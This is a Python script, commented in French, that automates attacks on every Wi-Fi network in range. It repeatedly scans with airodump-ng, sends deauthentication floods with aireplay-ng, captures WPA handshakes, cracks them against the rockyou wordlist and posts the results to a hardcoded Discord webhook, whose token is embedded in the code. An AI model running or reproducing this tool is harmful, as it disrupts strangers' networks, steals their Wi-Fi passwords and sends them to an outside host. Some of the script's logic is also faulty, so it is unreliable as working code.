import os
import subprocess
import discord
from discord.ext import commands
import time

# Configuration
INTERFACE = "wlan1"
ROCKYOU_TXT = "rockyou.txt"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1295144722633068544/8Ul3DDQNNGJ3ljMSTLy24ddAaLqTbyHumRQmWaU0dwutVYbYG7U6x5Fi1cYQam5tYkba"
SCAN_DURATION = 10  # Durée de scan en secondes
OUTPUT_FILE = "wifi_networks.txt"

def capture_wifi(duration):
    print("Capture des réseaux Wi-Fi...")
    # Lancer airodump-ng en arrière-plan
    process = subprocess.Popen(["airodump-ng", INTERFACE], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(duration)  # Attendre la durée de scan
    process.terminate()  # Terminer le processus airodump-ng
    return process.stdout.read().decode()

def save_results_to_file(results):
    with open(OUTPUT_FILE, "w") as file:
        file.write(results)
    print(f"Résultats enregistrés dans {OUTPUT_FILE}")

def deauth_clients(bssid):
    print(f"Déauthentification des clients sur le réseau {bssid}...")
    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, INTERFACE])

def get_handshakes(bssid, ssid):
    print(f"Récupération des handshakes pour le réseau {ssid}...")
    subprocess.run(["airodump-ng", "-w", ssid, "--bssid", bssid, INTERFACE])

def crack_handshakes(ssid):
    print(f"Crack des handshakes pour le réseau {ssid}...")
    results = subprocess.run(["aircrack-ng", "-w", ROCKYOU_TXT, "-b", ssid + "-01.cap"], capture_output=True, text=True)
    return results.stdout

def send_results(results):
    print("Envoi des résultats sur Discord...")
    webhook = discord.Webhook.from_url(DISCORD_WEBHOOK, adapter=discord.RequestsWebhookAdapter())
    webhook.send(results)

def main():
    while True:
        try:
            wifi_output = capture_wifi(SCAN_DURATION)
            save_results_to_file(wifi_output)
            bssids = []
            ssids = []
            for line in wifi_output.splitlines():
                if "BSSID" in line:
                    continue
                parts = line.split()
                if len(parts) > 0 and parts[0].count(':') == 5:
                    bssids.append(parts[0])
                    ssids.append(parts[13])

            for bssid, ssid in zip(bssids, ssids):
                deauth_clients(bssid)
                time.sleep(5)  # Attendez un peu pour permettre la déconnexion
                get_handshakes(bssid, ssid)
                results = crack_handshakes(ssid)
                send_results(results)

            time.sleep(60)  # Attendre avant de recommencer la capture

        except Exception as e:
            print(f"Une erreur s'est produite : {e}")
            time.sleep(10)  # Attendre avant de réessayer

if __name__ == "__main__":
    main()
